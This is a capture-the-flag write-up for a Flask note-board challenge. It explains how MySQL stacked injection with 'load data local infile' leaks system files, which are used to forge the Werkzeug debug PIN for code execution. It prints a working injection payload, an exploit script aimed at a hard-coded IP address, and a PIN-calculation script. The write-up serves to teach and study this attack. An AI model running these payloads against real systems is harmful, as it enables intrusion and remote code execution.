# oh-my-notepro-EN

After opening the website and completing the login, it is found that it is a note recording board. Each login user can send a note to their account. After trying to access the abnormal URL, we will find the flask debug information. It intuitively feels that it is a challenge about PIN code. First, we have to find LFI.

Visit route `/view`, debug code is

```
result = db.session.execute(sql, params={"multi":True})
```

It can be seen that there is a possibility of Stack Injection here. It is speculated that MySQL stack injection can read the file and use the error return the  the local file content. We can use `load_file` to read to `/etc/passwd`. However, when trying to read the file name information required by forging the PIN code, it is found that the file content cannot be read. Because `load_file` can't successfully read some files involving system information. Instead, `load data infile` can do it. But we still can't construct the correct PIN. There are two reasons:

* MySQL service and Web service belong to two different containers. Using `load data infile` to read the file information of MySQL container, which is not the running environment information of Web service. Therefore, `load data local infile` should be used to read the file information of Web service to construct PIN code. Refer to POC as follows

```
view?note_id=';CREATE TABLE IF NOT EXISTS {tmp_database}(cmd text);Load data local infile '{file}' into table {tmp_database};select * from users where username=1 and (extractvalue(1,concat(0x7e,(select substr((select group_concat(cmd) from {tmp_database}),{str(z)},{str(20)})),0x7e)));
```

* Through reading the source code, we can see that the update of Werkzeug has brought changes to the calculation method of PIN code` https://github.com/pallets/werkzeug/commit/617309a7c317ae1ade428de48f5bc4a906c2950f `, using most of the online PIN code calculation methods directly can not calculate the correct PIN code in the current environment. There are two main changes. One is to read `/proc/self/cgroup、/etc/machine-id、/proc/sys/kernel/random/boot_id` these three files, read the contents of one file and return directly. The new version is from `/etc/machine-id、/proc/sys/kernel/random/boot_id`, and then add it with the value in `/proc/self/cgroup`, and use the spliced value to calculate the PIN code; The second change is that the calculation of `h` changes from MD5 to SHA1, so the POC for calculating the pin code also needs to be adjusted accordingly. In addition, after entering the correct PIN code, there is a high probability of 404 and other errors. This problem can be solved by cleaning the website cache and then starting a new traceless session.

The reference POC is as follows:

```
# exp.py

import requests
import re
import string
import random
from pin import solve

def get_content(file, regexp):
    ans = ''
    z = 1
    while True:
        try:
            tmp_database = get_random_id()
            path = f"view?note_id=';CREATE TABLE IF NOT EXISTS {tmp_database}(cmd text);Load data local infile '{file}' into table {tmp_database};select * from users where username=1 and (extractvalue(1,concat(0x7e,(select substr((select group_concat(cmd) from {tmp_database}),{str(z)},{str(20)})),0x7e)));"
            view_url = base_url + path
            r = s.get(url=view_url)
            content = re.findall("'~(.*?)'", r.text)[0]
            if content[0] == '~':
                break
            ans += content[:-1]
            if content[-1] != '~':
                break
            z += 20
            print(ans)
            
        except Exception as e:
            print(e)
            break
    k = re.findall(regexp, ans)[0]
    print('k is: ', k)
    return k

def get_random_id():
    alphabet = list(string.ascii_lowercase + string.digits)
    return ''.join([random.choice(alphabet) for _ in range(32)])

base_url = 'http://localhost:5002/'
base_url = 'http://124.223.208.221:5002/'
s = requests.session()

login_data = {
    'username': "veererere",
    'password': "fefefef"
}
proxies = {
    'http': 'http://127.0.0.1:8080'
}
login_url = base_url + 'login'
r = s.post(url=login_url, data=login_data, proxies=proxies)

cgroup = get_content('/proc/self/cgroup', 'docker/(.*?),')
machine_id = get_content('/etc/machine-id', '(.*)')
eth0 = get_content('/sys/class/net/eth0/address', '(.*)')

eth0 = str(int(eth0.replace(':',''),16))

print("eth0 is: ", eth0)
print("machine_id is: ", machine_id)
print("cgroup is: ", cgroup)
solve('ctf', eth0, machine_id, cgroup)

```

```
# pin.py

import hashlib
from itertools import chain

def solve(username, eth0, machine_id, cgroup):
    probably_public_bits = [
    username,# username ok
    'flask.app', # ok
    'Flask' #ok,
    '/usr/local/lib/python3.8/site-packages/flask/app.py' # ok
]

    private_bits = [
        eth0,# /sys/class/net/eth0/address
        machine_id + cgroup
        # '7cb84391-1303-4564-8eff-ef7571804198327e92627edf30f63fde916e3c3017aea76eeb876265a726270a575d391eeb4a'# machine-id
        # /etc/machine-id + /proc/self/cgroup
    ]

    h = hashlib.sha1()
    for bit in chain(probably_public_bits, private_bits):
        if not bit:
            continue
        if isinstance(bit, str):
            bit = bit.encode('utf-8')
        h.update(bit)
    h.update(b'cookiesalt')

    cookie_name = '__wzd' + h.hexdigest()[:20]

    num = None
    if num is None:
        h.update(b'pinsalt')
        num = ('%09d' % int(h.hexdigest(), 16))[:9]

    rv =None
    if rv is None:
        for group_size in 5, 4, 3:
            if len(num) % group_size == 0:
                rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                            for x in range(0, len(num), group_size))
                break
        else:
            rv = num
```

